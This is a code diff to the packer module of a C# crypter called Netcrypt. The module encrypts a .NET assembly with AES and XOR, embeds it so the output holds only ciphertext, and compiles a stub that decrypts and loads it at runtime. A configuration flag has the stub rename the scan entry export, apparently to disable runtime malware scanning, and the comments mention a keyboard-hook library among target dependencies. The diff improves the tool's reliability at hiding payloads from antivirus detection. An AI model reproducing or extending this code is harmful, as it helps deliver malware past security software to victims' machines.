@@ -35,6 +35,27 @@ namespace Netcrypt
     /// </summary>
     public class Packer
     {
+        // ---- payload storage mode ------------------------------------------
+        // true  : the encrypted payload is embedded as a real assembly resource
+        //         (identifier Netcrypt.Payload). Nothing payload related appears
+        //         in the generated stub source, so the packed file only ever
+        //         contains ciphertext.
+        // false : legacy mode, the encrypted payload travels as base64 chunks
+        //         inside the generated stub source (%CHUNKS%).
+        // The stub understands both modes; flip this if the resource embedding
+        // is not honored by the compiler in use.
+        private const bool EmbedPayloadAsResource = true;
+
+        private const string PayloadResourceName = "Netcrypt.Payload";
+
+        // true  : the stub renames the scan entry export before loading the payload
+        //         (provided stub behaviour, default is unchanged).
+        // false : the stub leaves the scan entry untouched. Useful to tell whether a
+        //         runtime detection comes from the payload itself or from the rename.
+        private const bool NeutralizeInspectionEntry = true;
+
+        private const int SourceChunkSize = 60000;
+
         /// <summary>
         /// Packs the provided assembly using .NET 3.5 by default.
         /// </summary>
@@ -67,6 +88,11 @@ namespace Netcrypt
         /// <returns>a byte[] array containing the packed assembly</returns>
         public static byte[] Pack(byte[] assembly, string[] dependencyNames, byte[][] dependencyBytes, DotNetVersion version)
         {
+            if (assembly == null)
+            {
+                throw new ArgumentNullException("assembly");
+            }
+
             // ---- build payload container ---------------------------------
             // format:
             //   Int32 count
@@ -74,7 +100,151 @@ namespace Netcrypt
             //     String name (BinaryWriter 7-bit length prefix)
             //     Byte[] data (Int32 length prefix)
             //   Byte[] main assembly (Int32 length prefix)
-            byte[] payload;
+            byte[] payload = BuildContainer(assembly, dependencyNames, dependencyBytes);
+            VerifyContainer(payload, dependencyNames, dependencyBytes, assembly);
+
+            // ---- encryption layer ----------------------------------------
+            // The container is encrypted with AES-256-CBC (PKCS7) under a key and IV
+            // generated for this file, then passed through a 32 byte XOR pass. Only
+            // the result leaves this method; the plaintext container never reaches
+            // the generated stub or the resource.
+            RijndaelManaged rijndael = new RijndaelManaged();
+            rijndael.KeySize = 256;
+            rijndael.BlockSize = 128;
+            rijndael.Mode = CipherMode.CBC;
+            rijndael.Padding = PaddingMode.PKCS7;
+            rijndael.GenerateKey();
+            rijndael.GenerateIV();
+
+            string key = Convert.ToBase64String(rijndael.Key);
+            string iv = Convert.ToBase64String(rijndael.IV);
+
+            byte[] xorKey = new byte[32];
+            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+            {
+                rng.GetBytes(xorKey);
+            }
+            string xorKeyValue = Convert.ToBase64String(xorKey);
+
+            byte[] encrypted = Crypt(rijndael, payload, true);
+            byte[] xored = Xor(encrypted, xorKey);
+
+            // Pack time self check: the exact bytes the stub will read have to decrypt
+            // back into the container that was just built. A mismatch means the packed
+            // file could never start, so fail here instead of on the target.
+            byte[] roundTrip = Crypt(rijndael, Xor(xored, xorKey), false);
+            if (!BytesEqual(roundTrip, payload))
+            {
+                throw new Exception("Payload crypto self-check failed: the stub would not recover the container.");
+            }
+
+            // ---- place the ciphertext ------------------------------------
+            string resourceFile = null;
+            string chunkValue = "";
+            if (EmbedPayloadAsResource)
+            {
+                resourceFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".bin");
+                File.WriteAllBytes(resourceFile, xored);
+            }
+            else
+            {
+                chunkValue = ToSourceChunks(Convert.ToBase64String(xored));
+            }
+
+            string csharpcode = netcrypt.Properties.Resources.StubCode;
+
+            csharpcode = csharpcode.Replace("%XORKEY%", xorKeyValue);
+            csharpcode = csharpcode.Replace("%KEY%", key);
+            csharpcode = csharpcode.Replace("%IV%", iv);
+            csharpcode = csharpcode.Replace("%CHUNKS%", chunkValue);
+            csharpcode = csharpcode.Replace("%INSPECTION%", NeutralizeInspectionEntry ? "true" : "false");
+
+            var providerOptions = new Dictionary<string, string>();
+
+            switch (version)
+            {
+                case DotNetVersion.v4_0:
+                    providerOptions.Add("CompilerVersion", "v4.0");
+                    break;
+                case DotNetVersion.v3_5:
+                    providerOptions.Add("CompilerVersion", "v3.5");
+                    break;
+                case DotNetVersion.v2_0:
+                default:
+                    providerOptions.Add("CompilerVersion", "v4.0");
+                    break;
+            }
+
+            CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);
+
+            CompilerParameters parameters = new CompilerParameters();
+
+            parameters.CompilerOptions = "/target:winexe";
+
+            // The stub is self-contained; it only needs System.Windows.Forms for MessageBox.
+            // Do not mirror the target's references: third-party assemblies such as
+            // Gma.System.MouseKeyHook are not resolvable by the stub compiler (CS0006).
+            parameters.ReferencedAssemblies.Add("System.dll");
+            parameters.ReferencedAssemblies.Add("System.Core.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+
+            if (resourceFile != null)
+            {
+                // /resource:<file>,<identifier>; the stub opens the stream by identifier.
+                // The path is quoted here because the compiler command line is built from
+                // CompilerOptions verbatim and the temp directory may contain spaces.
+                parameters.CompilerOptions += " /resource:\"" + resourceFile + "\"," + PayloadResourceName;
+            }
+
+            string tempFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
+
+            parameters.GenerateExecutable = true;
+            parameters.OutputAssembly = tempFile;
+
+            try
+            {
+                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);
+
+                // ---- diagnostic: surface stub compile errors instead of hiding them ----
+                if (results.Errors.HasErrors)
+                {
+                    StringBuilder sb = new StringBuilder();
+                    sb.AppendLine("Stub compile failed:");
+                    foreach (CompilerError err in results.Errors)
+                    {
+                        sb.AppendLine(err.ToString());
+                    }
+                    throw new Exception(sb.ToString());
+                }
+                if (results.CompiledAssembly == null)
+                {
+                    throw new Exception("Stub compile returned no assembly.");
+                }
+
+                byte[] barr = File.ReadAllBytes(tempFile);
+                if (barr.Length == 0)
+                {
+                    throw new Exception("Failed to read compiled stub output: " + tempFile);
+                }
+
+                if (resourceFile != null && !ContainsAscii(barr, PayloadResourceName))
+                {
+                    throw new Exception(
+                        "Stub compiled, but the embedded payload resource was not found in the output. " +
+                        "Set EmbedPayloadAsResource to false in Packer.cs to fall back to source chunks.");
+                }
+
+                return barr;
+            }
+            finally
+            {
+                TryDelete(tempFile);
+                TryDelete(resourceFile);
+            }
+        }
+
+        private static byte[] BuildContainer(byte[] assembly, string[] dependencyNames, byte[][] dependencyBytes)
+        {
             using (MemoryStream payloadStream = new MemoryStream())
             {
                 using (BinaryWriter bw = new BinaryWriter(payloadStream))
@@ -97,147 +267,101 @@ namespace Netcrypt
                     }
                     bw.Write((int)assembly.Length);
                     bw.Write(assembly, 0, assembly.Length);
+                    bw.Flush();
                 }
-                payload = payloadStream.ToArray();
+                return payloadStream.ToArray();
             }
+        }
 
-            VerifyContainer(payload, dependencyNames, dependencyBytes, assembly);
-
-            // ---- AES (Rijndael) layer ------------------------------------
-            RijndaelManaged rijndael = new RijndaelManaged();
-            rijndael.KeySize = 256;
-            rijndael.GenerateIV();
-            rijndael.GenerateKey();
-            rijndael.Padding = PaddingMode.ISO10126;
-
-            string key = Convert.ToBase64String(rijndael.Key);
-            string iv = Convert.ToBase64String(rijndael.IV);
-
-            // ---- XOR layer (extra transform applied to the encrypted payload) ----
-            byte[] xorKey = new byte[32];
-            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
-            {
-                rng.GetBytes(xorKey);
-            }
-            string xorKeyValue = Convert.ToBase64String(xorKey);
-
-            byte[] encrypted;
+        private static byte[] Crypt(SymmetricAlgorithm algorithm, byte[] data, bool encrypt)
+        {
+            ICryptoTransform transform = encrypt ? algorithm.CreateEncryptor() : algorithm.CreateDecryptor();
             using (MemoryStream memoryStream = new MemoryStream())
             {
-                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write))
+                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                 {
-                    cryptoStream.Write(payload, 0, payload.Length);
+                    cryptoStream.Write(data, 0, data.Length);
                     cryptoStream.FlushFinalBlock();
                 }
-                encrypted = memoryStream.ToArray();
+                return memoryStream.ToArray();
             }
+        }
 
-            byte[] xored = new byte[encrypted.Length];
-            for (int i = 0; i < encrypted.Length; i++)
+        private static byte[] Xor(byte[] data, byte[] key)
+        {
+            byte[] result = new byte[data.Length];
+            for (int i = 0; i < data.Length; i++)
             {
-                xored[i] = (byte)(encrypted[i] ^ xorKey[i % xorKey.Length]);
+                result[i] = (byte)(data[i] ^ key[i % key.Length]);
             }
+            return result;
+        }
 
-            string app = Convert.ToBase64String(xored);
+        private static bool BytesEqual(byte[] left, byte[] right)
+        {
+            if (left == null || right == null || left.Length != right.Length)
+            {
+                return false;
+            }
+            for (int i = 0; i < left.Length; i++)
+            {
+                if (left[i] != right[i])
+                {
+                    return false;
+                }
+            }
+            return true;
+        }
 
-            // split the base64 payload into chunks so the generated stub never
+        private static bool ContainsAscii(byte[] haystack, string needle)
+        {
+            byte[] pattern = Encoding.ASCII.GetBytes(needle);
+            for (int i = 0; i + pattern.Length <= haystack.Length; i++)
+            {
+                int j = 0;
+                while (j < pattern.Length && haystack[i + j] == pattern[j])
+                {
+                    j++;
+                }
+                if (j == pattern.Length)
+                {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        private static string ToSourceChunks(string encoded)
+        {
+            // split the encoded payload into chunks so the generated stub never
             // contains one giant string literal (compiler truncation risk)
-            int chunkSize = 60000;
             StringBuilder chunkSource = new StringBuilder();
-            for (int i = 0; i < app.Length; i += chunkSize)
+            for (int i = 0; i < encoded.Length; i += SourceChunkSize)
             {
                 if (i > 0)
                 {
                     chunkSource.AppendLine(",");
                 }
-                int len = Math.Min(chunkSize, app.Length - i);
+                int len = Math.Min(SourceChunkSize, encoded.Length - i);
                 chunkSource.Append("\"");
-                chunkSource.Append(app.Substring(i, len));
+                chunkSource.Append(encoded.Substring(i, len));
                 chunkSource.Append("\"");
             }
-            string chunkValue = chunkSource.ToString();
+            return chunkSource.ToString();
+        }
 
-            string csharpcode = netcrypt.Properties.Resources.StubCode;
-
-            csharpcode = csharpcode.Replace("%XORKEY%", xorKeyValue);
-            csharpcode = csharpcode.Replace("%KEY%", key);
-            csharpcode = csharpcode.Replace("%IV%", iv);
-            csharpcode = csharpcode.Replace("%CHUNKS%", chunkValue);
-
-            var providerOptions = new Dictionary<string, string>();
-
-            switch (version)
+        private static void TryDelete(string path)
+        {
+            try
             {
-                case DotNetVersion.v4_0:
-                    providerOptions.Add("CompilerVersion", "v4.0");
-                    break;
-                case DotNetVersion.v3_5:
-                    providerOptions.Add("CompilerVersion", "v3.5");
-                    break;
-                case DotNetVersion.v2_0:
-                default:
-                    providerOptions.Add("CompilerVersion", "v4.0");
-                    break;
+                if (!String.IsNullOrEmpty(path) && File.Exists(path))
+                {
+                    File.Delete(path);
+                }
             }
-
-            CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);
-
-
-
-            CompilerParameters parameters = new CompilerParameters();
-
-            parameters.CompilerOptions = "/target:winexe";
-
-            // The stub is self-contained; it only needs System.Windows.Forms for MessageBox.
-            // Do not mirror the target's references: third-party assemblies such as
-            // Gma.System.MouseKeyHook are not resolvable by the stub compiler (CS0006).
-            parameters.ReferencedAssemblies.Add("System.dll");
-            parameters.ReferencedAssemblies.Add("System.Core.dll");
-            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
-
-            string tempFile = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + ".exe";
-
-            parameters.GenerateExecutable = true;
-            parameters.OutputAssembly = tempFile;
-
-            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);
-
-            // ---- diagnostic: surface stub compile errors instead of hiding them ----
-            if (results.Errors.HasErrors)
+            catch
             {
-                StringBuilder sb = new StringBuilder();
-                sb.AppendLine("Stub compile failed:");
-                foreach (CompilerError err in results.Errors)
-                {
-                    sb.AppendLine(err.ToString());
-                }
-                throw new Exception(sb.ToString());
             }
-            if (results.CompiledAssembly == null)
-            {
-                throw new Exception("Stub compile returned no assembly.");
-            }
-
-            try {
-                FileStream fs = results.CompiledAssembly.GetFiles()[0];
-                byte[] barr  = new byte[fs.Length];
-                int r = fs.Read(barr, 0, barr.Length);
-                fs.Close();
-                string fileName = fs.Name;
-                fs.Dispose();
-
-                if (r == barr.Length)
-                {
-                    return barr;
-                }
-                else
-                {
-                    return null;
-                }
-            } catch (Exception ex2) {
-                throw new Exception("Failed to read compiled stub output: " + ex2.Message, ex2);
-            }
-
         }
 
         private static void VerifyContainer(byte[] payload, string[] dependencyNames, byte[][] dependencyBytes, byte[] assembly)
